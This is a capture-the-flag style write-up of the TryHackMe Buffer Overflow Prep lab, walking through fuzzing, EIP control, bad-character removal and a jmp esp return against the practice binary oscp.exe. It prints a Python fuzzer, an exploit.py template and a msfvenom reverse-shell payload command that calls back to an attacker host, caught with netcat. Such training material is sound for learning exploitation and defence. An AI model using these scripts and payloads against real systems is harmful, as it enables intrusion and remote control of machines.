---
title: TryHackMe BufferOverflow
description: Buffer Overflow Prep
categories:
 - tryhackme

tags: tryhackme Bufferoverflow

---

## Summary

Practice stack based buffer overflows!


## Starting Immunity Debugger

![Screenshot_2021-08-13_04_01_12](https://user-images.githubusercontent.com/35343744/196925791-6607e075-39bf-436d-8ad5-38bd9822ab37.png)




Right-click the Immunity Debugger icon on the Desktop and choose "Run as administrator".


![Screenshot_2021-08-13_04_02_29](https://user-images.githubusercontent.com/35343744/196926181-9e304bcf-9035-48f4-96a1-7767948b8888.png)


When Immunity loads, click the open file icon, or choose File -> Open. Navigate to the vulnerable-apps folder on the admin user's desktop, and then the "oscp" folder. Select the "oscp" (oscp.exe) binary and click "Open".

![Screenshot_2021-08-13_04_02_38](https://user-images.githubusercontent.com/35343744/215253653-69964b24-305c-4870-af61-5cb376ae6d35.png)

![Screenshot_2021-08-13_04_03_02](https://user-images.githubusercontent.com/35343744/215253778-6d7da473-8270-47fd-bac0-306be0a8a661.png)



## Mona Configuration

Run these command in the input box at the bottom of the immunity Debugger window.

```
!mona config -set workingfolder c:\mona\%p
```
![Screenshot_2021-08-13_04_03_54](https://user-images.githubusercontent.com/35343744/215253784-af314231-ee43-4474-8bff-64ec39af9857.png)




## Fuzzing

Run this python script to fuzz

```
#!/usr/bin/env python3

import socket, time, sys

ip = "MACHINE_IP"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)

```

![Screenshot_2021-08-13_04_04_52](https://user-images.githubusercontent.com/35343744/215253887-7d1630fd-659c-466e-90bb-805cea642a8d.png)



Basically, this script is going to send increasingly long strings comprised of As. If the server gets crashed, the fuzzer should exit with an error message.

![Screenshot_2021-08-13_04_05_45](https://user-images.githubusercontent.com/35343744/215253942-b2ef8349-7a18-423a-942b-2d246fd01896.png)

![Screenshot_2021-08-13_04_06_06](https://user-images.githubusercontent.com/35343744/215253951-d78c956b-27df-4742-9585-b5219c626c53.png)



## Crash Replication & Controlling EIP

Run the following command to generate a cyclic pattern of a length 2400 bytes longer that the string that crashed the server (change the -l value to this):

```
msf-pattern create -l 2400
```

![Screenshot_2021-08-13_04_06_23](https://user-images.githubusercontent.com/35343744/215254301-0cada39d-ea5c-4a4f-b5c1-e531f1660e8d.png)

Now save the below script in exploit.py.

```
import socket

ip = "MACHINE_IP"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

![Screenshot_2021-08-13_04_08_39](https://user-images.githubusercontent.com/35343744/215254365-d6c2ac01-9dc7-4e01-86ed-d2bdedb4b946.png)


Run the exploit.py and lets see if we can crash.

![Screenshot_2021-08-13_04_10_44](https://user-images.githubusercontent.com/35343744/215254396-75c040b4-f78e-4466-a35f-4067deecfbdc.png)

The script should crash the oscp.exe server again. This time, in Immunity Debugger, in the command input box at the bottom of the screen, run the following mona command, changing the distance to the same length as the pattern you created:

```
!mona findmsp -distance 2400
```

![Screenshot_2021-08-13_04_11_21](https://user-images.githubusercontent.com/35343744/215254453-59431d0b-45fa-4697-92a9-0397f9a6525d.png)


Mona should display a log window with the output of the command. If not, click the "Window" menu and then "Log data" to view it (choose "CPU" to switch back to the standard view).

In this output you should see a line which states:

```
EIP contains normal pattern : ... (offset XXXX)
```
Update your exploit.py script and set the offset variable to this value (was previously set to 0). Set the payload variable to an empty string again. Set the retn variable to "BBBB".

![Screenshot_2021-08-13_04_12_27](https://user-images.githubusercontent.com/35343744/215254521-54e8839c-f0db-43a9-94e7-cf6e49ac7c73.png)

Run Exploit.py.

![Screenshot_2021-08-13_04_13_48](https://user-images.githubusercontent.com/35343744/215254651-63f206b7-84bb-473f-97d3-f9c4ca20d984.png)


Restart oscp.exe in Immunity and run the modified exploit.py script again. 

![Screenshot_2021-08-13_04_13_20](https://user-images.githubusercontent.com/35343744/215254583-9b0eda53-33c0-4e33-b3b5-5bfa1cdfc530.png)

The EIP register should now be overwritten with the 4 B's (e.g. 42424242).

![Screenshot_2021-08-13_04_13_57](https://user-images.githubusercontent.com/35343744/215254681-1ad06c42-e1e0-4490-9d14-fe92ef5e639d.png)


## Finding Bad Characters

﻿Generate a bytearray using mona, and exclude the null byte (\x00) by default. Note the location of the bytearray.bin file that is generated (if the working folder was set per the Mona Configuration section of this guide, then the location should be C:\mona\oscp\bytearray.bin).
 

Now generate a string of bad chars that is identical to the bytearray. The following python script can be used to generate a string of bad chars from \x01 to \xff:

```
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```


![Screenshot_2021-08-13_04_14_29](https://user-images.githubusercontent.com/35343744/215255042-c6e57b22-b47d-4079-aa23-a00acb8833dd.png)


Update your exploit.py script and set the payload variable to the string of bad chars the script generates.


![Screenshot_2021-08-13_04_15_22](https://user-images.githubusercontent.com/35343744/215255056-d2b070c6-6de5-441d-b933-cdc782bf80fb.png)


![Screenshot_2021-08-13_04_16_41](https://user-images.githubusercontent.com/35343744/215255093-b2796ec9-4a13-4f0f-a293-88f608f5b45c.png)


![Screenshot_2021-08-13_04_16_52](https://user-images.githubusercontent.com/35343744/215255126-74a5df3f-49b6-4777-8235-d50c6b9f9cd1.png)

![Screenshot_2021-08-13_04_17_02](https://user-images.githubusercontent.com/35343744/215255259-eab82576-4f82-4718-8c7e-82a726ea0470.png)

![Screenshot_2021-08-13_04_17_12](https://user-images.githubusercontent.com/35343744/215255275-5a696fb6-4dfa-4ef8-9232-85c2ff2b11a6.png)

Restart oscp.exe in Immunity and run the modified exploit.py script again. Make a note of the address to which the ESP register points and use it in the following mona command:

```
!mona compare -f C:\mona\oscp\bytearray.bin -a <address>
```

![Screenshot_2021-08-13_04_18_50](https://user-images.githubusercontent.com/35343744/215255396-6b884aa5-48e7-4995-bc15-089ba668aa79.png)


A popup window should appear labelled "mona Memory comparison results". If not, use the Window menu to switch to it. The window shows the results of the comparison, indicating any characters that are different in memory to what they are in the generated bytearray.bin file.

![Screenshot_2021-08-13_04_18_58](https://user-images.githubusercontent.com/35343744/215255458-0a6340ff-1f75-432e-b715-8d8c195186b5.png)

![Screenshot_2021-08-13_04_20_22](https://user-images.githubusercontent.com/35343744/215255483-aa236cbe-4be2-465c-8ce1-35b2f21247b0.png)

![Screenshot_2021-08-13_04_22_23](https://user-images.githubusercontent.com/35343744/215255489-17f2ea5c-b67b-43f9-ac74-2bc7b544bf99.png)


Not all of these might be badchars! Sometimes badchars cause the next byte to get corrupted as well, or even effect the rest of the string.

The first badchar in the list should be the null byte (\x00) since we already removed it from the file. Make a note of any others. Generate a new bytearray in mona, specifying these new badchars along with \x00. Then update the payload variable in your exploit.py script and remove the new badchars as well.

Restart oscp.exe in Immunity and run the modified exploit.py script again. Repeat the badchar comparison until the results status returns "Unmodified". This indicates that no more badchars exist.

![Screenshot_2021-08-13_04_23_37](https://user-images.githubusercontent.com/35343744/215255543-dc49c56a-4dd9-497f-810c-552a0156b5c0.png)



## Finding a Jump Point

With the oscp.exe either running or in a crashed state, run the following mona command, making sure to update the -cpb option with all the badchars you identified (including \x00):
```
!mona jmp -r esp -cpb "\x00"

```

This command finds all "jmp esp" (or equivalent) instructions with addresses that don't contain any of the badchars specified. The results should display in the "Log data" window (use the Window menu to switch to it if needed).

Choose an address and update your exploit.py script, setting the "retn" variable to the address, written backwards (since the system is little endian). For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit.

![Screenshot_2021-08-13_04_25_18](https://user-images.githubusercontent.com/35343744/215255615-5b02e95e-2254-4051-b50d-52c24367d8ef.png)

![Screenshot_2021-08-13_04_26_45](https://user-images.githubusercontent.com/35343744/215255624-6bf9e2fb-16b0-49fb-8563-f22fc7afb33b.png)



## Generate Payload

```
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c
```

![Screenshot_2021-08-13_04_27_45](https://user-images.githubusercontent.com/35343744/215255659-2afa4ab9-245e-4e5c-8096-81a585c67374.png)

Copy the generated C code strings and integrate them into your exploit.py script payload variable.

![Screenshot_2021-08-13_04_29_20](https://user-images.githubusercontent.com/35343744/215255713-46921361-d186-4859-b1c8-a1a1f772b6fe.png)

## Prepend NOPs
Since an encoder was likely used to generate the payload, you will need some space in memory for the payload to unpack itself. You can do this by setting the padding variable to a string of 16 or more "No Operation" (\x90) bytes:

```
padding = "\x90" * 16
```
See line no 10 in the screenshot:

![Screenshot_2021-08-13_04_29_20](https://user-images.githubusercontent.com/35343744/215255713-46921361-d186-4859-b1c8-a1a1f772b6fe.png)



## Exploit:

With the correct prefix, offset, return address, padding, and payload set, you can now exploit the buffer overflow to get a reverse shell.

Start a netcat listener on your Kali box using the LPORT you specified in the msfvenom command (4444 if you didn't change it).

Restart oscp.exe in Immunity and run the modified exploit.py script again. Your netcat listener should catch a reverse shell!

![Screenshot_2021-08-13_04_30_19](https://user-images.githubusercontent.com/35343744/215255844-d502eeca-af19-4cd0-b08f-2b5107d4fb81.png)


![Screenshot_2021-08-13_04_30_55](https://user-images.githubusercontent.com/35343744/215255850-09933697-1e31-4fe5-8c2d-bf33fab1f573.png)


![Screenshot_2021-08-13_04_34_05](https://user-images.githubusercontent.com/35343744/215255861-6d70a358-d829-4fbc-b006-effefbb6f9e0.png)


![Screenshot_2021-08-13_04_34_55](https://user-images.githubusercontent.com/35343744/215255870-8dd12c54-7fb4-436e-a2f8-2b213337c83c.png)

![Screenshot_2021-08-13_04_39_02](https://user-images.githubusercontent.com/35343744/215255875-2e79cb69-748a-45f5-8b79-dd6c643c8a97.png)






















